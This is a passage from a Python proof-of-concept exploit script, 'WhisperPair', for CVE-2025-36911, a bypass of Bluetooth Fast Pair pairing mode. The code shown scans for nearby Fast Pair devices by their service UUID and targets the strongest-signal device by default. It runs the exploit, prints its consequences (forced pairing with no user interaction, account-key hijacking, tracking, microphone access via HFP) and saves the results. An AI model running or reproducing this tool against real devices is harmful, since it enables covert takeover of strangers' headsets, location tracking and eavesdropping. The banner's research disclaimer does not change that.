        print(f"  BR/EDR Address: {result.br_edr_address or 'Unknown'}")
        print(f"  KBP Accepted: {Fore.RED}YES{Style.RESET_ALL}")
        print(f"  Account Key Written: {'YES' if result.account_key_written else 'NO'}")
        print(f"  Classic BT Paired: {'YES' if result.paired else 'NO'}")

        print(f"\n{Fore.YELLOW}Notifications received: {len(result.notifications)}{Style.RESET_ALL}")
        for i, n in enumerate(result.notifications, 1):
            print(f"  [{i}] {n['hex']} (entropy: {n['entropy']:.2f})")

        print(f"\n{Fore.YELLOW}Implications:{Style.RESET_ALL}")
        print(f"  - Attacker within BLE range (~30m) can force-pair")
        print(f"  - No user interaction required on target device")
        if result.account_key_written:
            print(f"  {Fore.RED}- Account key written: device hijacking possible{Style.RESET_ALL}")
            print(f"  {Fore.RED}- Find Hub tracking may be possible{Style.RESET_ALL}")
        if result.paired:
            print(f"  {Fore.RED}- Device paired: audio/mic access possible via HFP{Style.RESET_ALL}")


# ==============================================================================
# SCANNER
# ==============================================================================

async def scan_for_targets(timeout: int = 10) -> List[dict]:
    """Scan for Fast Pair devices"""
    print(f"{Fore.BLUE}[*] Scanning for Fast Pair devices ({timeout}s)...{Style.RESET_ALL}")

    devices = await BleakScanner.discover(timeout=timeout, return_adv=True)
    candidates = []

    for addr, (dev, adv) in devices.items():
        is_fast_pair = False

        if adv.service_uuids:
            for uuid in adv.service_uuids:
                if "fe2c" in str(uuid).lower():
                    is_fast_pair = True
                    break

        if adv.service_data and not is_fast_pair:
            for uuid in adv.service_data.keys():
                if "fe2c" in str(uuid).lower():
                    is_fast_pair = True
                    break

        if is_fast_pair:
            name = dev.name or adv.local_name or "Unknown"
            candidates.append({
                'address': addr,
                'name': name,
                'rssi': adv.rssi
            })
            print(f"{Fore.GREEN}[+] Found: {name} ({addr}) RSSI: {adv.rssi}{Style.RESET_ALL}")

    candidates.sort(key=lambda x: x['rssi'], reverse=True)
    return candidates


# ==============================================================================
# MAIN
# ==============================================================================

async def main():
    import sys

    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║  WhisperPair PoC - CVE-2025-36911                        ║")
    print(f"║  Fast Pair Pairing Mode Bypass                           ║")
    print(f"║                                                          ║")
    print(f"║  FOR SECURITY RESEARCH ON YOUR OWN DEVICES ONLY          ║")
    print(f"╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        targets = await scan_for_targets()

        if not targets:
            print(f"{Fore.RED}[-] No Fast Pair devices found{Style.RESET_ALL}")
            return

        print(f"\n{Fore.GREEN}[+] Found {len(targets)} device(s){Style.RESET_ALL}")
        target = targets[0]['address']
        print(f"{Fore.BLUE}[*] Using: {targets[0]['name']} ({target}){Style.RESET_ALL}")

    input(f"\n{Fore.YELLOW}Press Enter to start exploit...{Style.RESET_ALL}")

    exploit = WhisperPairExploit(target)
    result = await exploit.run_exploit()
    exploit.print_summary(result)

    # Save results
    import json
    filename = f"whisperpair_result_{target.replace(':', '-')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    result_dict = {
        'target': target,
        'model_id': exploit.model_id,
        'vulnerable': result.vulnerable,
        'br_edr_address': result.br_edr_address,
        'paired': result.paired,
        'account_key_written': result.account_key_written,
        'message': result.message,
        'notifications': [
            {'hex': n['hex'], 'entropy': n['entropy']}
            for n in result.notifications
        ],
        'timestamp': datetime.now().isoformat()
    }

    with open(filename, 'w') as f:
        json.dump(result_dict, f, indent=2)

    print(f"\n{Fore.BLUE}[+] Results saved to: {filename}{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Cancelled by user{Style.RESET_ALL}")
